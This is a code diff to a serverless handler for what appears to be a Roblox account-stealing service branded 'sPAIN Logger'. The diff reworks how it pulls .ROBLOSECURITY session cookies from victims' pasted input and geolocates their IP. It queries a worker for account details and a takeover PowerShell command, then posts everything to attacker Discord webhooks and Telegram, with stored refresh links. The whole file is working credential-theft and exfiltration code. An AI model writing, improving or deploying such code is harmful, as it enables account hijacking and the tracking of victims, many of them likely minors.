@@ -19,16 +19,13 @@ async function redisGet(key) {
     });
     const json = await res.json();
     if (!json.result) return null;
-    let record = json.result;
-    if (typeof record === 'string') { try { record = JSON.parse(record); } catch { return null; } }
-    if (record && typeof record.value === 'string' && !record.webhook) {
-      try { record = JSON.parse(record.value); } catch {}
-    }
-    return record || null;
+    let r = json.result;
+    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
+    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
+    return r || null;
   } catch { return null; }
 }
 
-// ── redisSet — was missing, causing the ReferenceError crash ──────────────────
 async function redisSet(key, value) {
   try {
     const res = await fetch(
@@ -42,7 +39,7 @@ async function redisSet(key, value) {
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
-    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
+    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
     const d = await r.json();
     return d.status === 'success' ? d : null;
   } catch { return null; }
@@ -62,12 +59,9 @@ const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-
 function extractCookie(raw) {
   if (!raw) return null;
   const s = raw.trim();
-  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
-  if (m1) return m1[1];
-  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
-  if (m2) return WARN + m2[1];
-  const m3 = s.match(/\|_([\w\-]{50,})/);
-  if (m3) return WARN + m3[1];
+  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);  if (m1) return m1[1];
+  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                      if (m2) return WARN + m2[1];
+  const m3 = s.match(/\|_([\w\-]{50,})/);                                  if (m3) return WARN + m3[1];
   if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
   return null;
 }
@@ -79,23 +73,17 @@ function findCookie(slots) {
   return null;
 }
 
-async function getPowerShell(cookie) {
+// Worker returns BOTH Roblox info AND powershell in one call
+async function getWorkerData(cookie, victimIp) {
   try {
     const r = await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie })
+      body: JSON.stringify({ cookie, victimIp })
     });
     if (!r.ok) return null;
-    const d = await r.json();
-    return d.success ? d.powershell : null;
+    return await r.json();
   } catch { return null; }
-}
-
-function slotSummary(slots) {
-  return Object.entries(slots || {})
-    .map(([k, v]) => `Slot ${k.replace('slot','')}: ${v||'(empty)'}`)
-    .join('\n');
 }
 
 async function discordSend(url, payload) {
@@ -109,68 +97,93 @@ async function discordSend(url, payload) {
   } catch (_) {}
 }
 
-async function sendHit(webhookUrl, { powershell, cookie, slots, ip, geo, now, pageName }) {
-  await discordSend(webhookUrl, {
-    content: '@everyone',
-    embeds: [{
-      title: `✅ Cookie Captured — ${pageName}`,
-      description: 'Run the **PowerShell command** below to access the account.',
-      color: 0x00cc44,
-      fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                           inline: true  },
-        { name: '📍 Location', value: `${geo?.city||'?'}, ${geo?.country||'?'}`, inline: true  },
-        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                     inline: true  },
-        { name: '🕐 Time',     value: now,                                        inline: false }
-      ],
-      footer: { text: `sPAIN Logger • ${pageName} • ${now}` }
-    }]
-  });
-
-  if (powershell) {
-    let rem = powershell; let first = true;
-    while (rem.length > 0) {
-      const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
-      const content = first
-        ? '```powershell\n' + chunk + (rem.length > 0 ? '' : '\n```')
-        : chunk + (rem.length > 0 ? '' : '\n```');
-      await discordSend(webhookUrl, { content });
-      first = false;
-    }
-  }
-
-  let remCookie = cookie;
-  while (remCookie.length > 0) {
-    const chunk = remCookie.substring(0, 1990); remCookie = remCookie.substring(1990);
-    await discordSend(webhookUrl, { content: chunk });
+// Chunked text sender — splits anything >2000 chars
+async function discordText(url, text, lang = '') {
+  const prefix = lang ? `\`\`\`${lang}\n` : '';
+  const suffix = lang ? '\n```' : '';
+  const limit  = 1990 - prefix.length - suffix.length;
+  let rem = text;
+  while (rem.length > 0) {
+    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
+    await discordSend(url, { content: prefix + chunk + (rem.length === 0 ? suffix : '') });
   }
 }
 
-async function sendInvalid(webhookUrl, { slots, ip, geo, now, pageName }) {
+// ── Rich embed matching Image 2 ───────────────────────────────────────────────
+async function sendHit(webhookUrl, { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl }) {
+  const ps = powershell || '';
+
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
-      title: '⚠️ Invalid Cookie — someone trolling',
+      title:       `${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
+      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile)${refreshUrl ? `\n[🔄 Refresh PowerShell](${refreshUrl})` : ''}`,
+      color:       5793266,
+      thumbnail:   { url: roblox.avatarUrl },
+      fields: [
+        { name: '🔴 Robux',      value: `${roblox.robux?.toLocaleString() || 0}`,                                             inline: true  },
+        { name: '🎵 RAP',        value: `${roblox.limitedsValue?.toLocaleString() || 0}\n(${roblox.limitedsCount || 0} items)`,inline: true  },
+        { name: '🗓️ Age',        value: `${roblox.accountAgeDays} days`,                                                      inline: true  },
+        { name: '💎 Premium',    value: roblox.isPremium ? 'Yes ✅' : 'No ❌',                                                inline: true  },
+        { name: '👥 Groups',     value: `Owned: ${roblox.groupsOwned} | R$: ${roblox.groupRobux?.toLocaleString() || 0}`,    inline: true  },
+        { name: '🌐 IP',         value: ip || 'Unknown',                                                                      inline: true  },
+        {
+          name:   '📍 Location',
+          value:  [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') + (geo?.isp ? `\n${geo.isp}` : ''),
+          inline: false
+        },
+        { name: '⚙️ Account',    value: `Email: ${roblox.emailSet}  2FA: ${roblox.twoFA}`,                                   inline: false },
+        {
+          name:   '🎯 Gamepasses',
+          value:  `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`,
+          inline: false
+        },
+        {
+          name:   '📋 Slots (PowerShell)',
+          value:  '```\n' + ps.substring(0, 1000) + (ps.length > 1000 ? '\n... (continued below)' : '') + '\n```',
+          inline: false
+        }
+      ],
+      footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
+      timestamp: now
+    }]
+  });
+
+  // Send full PowerShell as separate messages if long
+  if (ps.length > 1000) {
+    await discordText(webhookUrl, ps, 'powershell');
+  }
+
+  // Raw cookie — separate message, chunked
+  await discordText(webhookUrl, cookie);
+}
+
+async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
+  await discordSend(webhookUrl, {
+    content: '@everyone',
+    embeds: [{
+      title:       '⚠️ Invalid Cookie — someone trolling 💀',
       description: 'Cookie was **invalid or fake**.',
-      color: 0xff3333,
+      color:       0xff3333,
       fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                           inline: true  },
-        { name: '📍 Location', value: `${geo?.city||'?'}, ${geo?.country||'?'}`, inline: true  },
-        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                     inline: true  },
-        { name: '📋 Slots',    value: '```\n' + slotSummary(slots).substring(0,950) + '\n```', inline: false },
-        { name: '🕐 Date',     value: now,                                        inline: false }
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                                     inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',                   inline: true  },
+        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                               inline: true  },
+        { name: '🕐 Date',     value: now,                                                                                  inline: false }
       ],
-      footer: { text: `sPAIN Tools • ${pageName}` }
+      footer:    { text: `sPAIN Tools • ${pageName}` },
+      timestamp: now
     }]
   });
 }
 
-async function sendRefreshLink(webhookUrl, refreshUrl) {
+async function sendRefreshCard(webhookUrl, refreshUrl, pageName) {
   await discordSend(webhookUrl, {
     embeds: [{
-      title: '🔄 Refresh Link — Get Fresh PowerShell Anytime',
-      description: `Click below whenever you need a new PowerShell for this account:\n**${refreshUrl}**`,
-      color: 0x06b6d4,
-      footer: { text: 'sPAIN Tools • Keep this private' }
+      title:       '🔄 Get Fresh PowerShell Anytime',
+      description: `Click the link below whenever you need a new PowerShell for this account:\n**${refreshUrl}**`,
+      color:       0x06b6d4,
+      footer:      { text: `sPAIN Tools • ${pageName} • Keep this private` }
     }]
   });
 }
@@ -191,7 +204,7 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });
 
-  // Respond immediately so client never times out
+  // Respond immediately — client never waits
   res.status(200).json({ success: true });
 
   try {
@@ -203,56 +216,60 @@ export default async function handler(req, res) {
       Promise.resolve(findCookie(slots))
     ]);
 
-    const powershell = cookie ? await getPowerShell(cookie) : null;
-    const isValid    = !!powershell;
-    const now        = new Date().toISOString();
-    const pageName   = record.displayName || slug;
-    const payload    = { powershell, cookie, slots, ip, geo, now, pageName };
+    // Single worker call — returns BOTH roblox info AND powershell
+    const workerData = cookie ? await getWorkerData(cookie, ip) : null;
+    const roblox     = workerData?.valid ? workerData : null;
+    const powershell = workerData?.powershell || null;
+    const isValid    = !!(roblox && powershell);
 
+    const now      = new Date().toISOString();
+    const pageName = record.displayName || slug;
+
+    // Load dualhook parent
     let parent = null;
-    if (record.dualhookParent) {
-      parent = await redisGet(`slot:${record.dualhookParent}`);
-    }
+    if (record.dualhookParent) parent = await redisGet(`slot:${record.dualhookParent}`);
 
-    const sendFn = isValid ? sendHit : sendInvalid;
-
-    await Promise.all([
-      sendFn(record.webhook, payload),
-      parent?.webhook && parent.webhook !== record.webhook
-        ? sendFn(parent.webhook, payload)
-        : Promise.resolve()
-    ]);
-
-    // Save cookie to Redis + send refresh link to Discord
+    // Generate refresh ID and save to Redis BEFORE sending Discord (so link is ready)
+    let refreshUrl = null;
     if (isValid && cookie) {
-      const refreshId  = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
-      const refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
-
-      // Save: cookie + webhooks needed to re-send later
+      const refreshId = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+      refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
       await redisSet(`refresh:${refreshId}`, {
         cookie,
         webhook:  record.webhook,
         webhook1: parent?.webhook || null,
         pageName
       });
+    }
 
-      await Promise.all([
-        sendRefreshLink(record.webhook, refreshUrl),
-        parent?.webhook && parent.webhook !== record.webhook
-          ? sendRefreshLink(parent.webhook, refreshUrl)
-          : Promise.resolve()
-      ]);
+    const payload = { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl };
+
+    if (isValid) {
+      // Main embed + full PS + raw cookie
+      await sendHit(record.webhook, payload);
+      if (parent?.webhook && parent.webhook !== record.webhook) {
+        await sendHit(parent.webhook, payload);
+      }
+      // Separate refresh card message
+      await sendRefreshCard(record.webhook, refreshUrl, pageName);
+      if (parent?.webhook && parent.webhook !== record.webhook) {
+        await sendRefreshCard(parent.webhook, refreshUrl, pageName);
+      }
+    } else {
+      await sendInvalid(record.webhook, { ip, geo, now, pageName });
+      if (parent?.webhook && parent.webhook !== record.webhook) {
+        await sendInvalid(parent.webhook, { ip, geo, now, pageName });
+      }
     }
 
     await tgSend(isValid ? [
-      `✅ <b>COOKIE CAPTURED</b>`,
-      `📄 Page: ${pageName} (${slug})`,
+      `✅ <b>VALID HIT — ${roblox.username} ${roblox.isPremium ? '⭐' : ''}</b>`,
+      `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
       `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-      `💻 PowerShell + refresh link sent to Discord`,
-      `🕐 ${now}`
+      `📄 Page: ${pageName}`,
+      `🔄 Refresh: ${refreshUrl}`
     ].join('\n') : [
-      `⚠️ <b>INVALID SUBMISSION</b>`,
-      `📄 Page: ${pageName} (${slug})`,
+      `⚠️ <b>INVALID — ${pageName}</b>`,
       `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
       `🕐 ${now}`
     ].join('\n'));
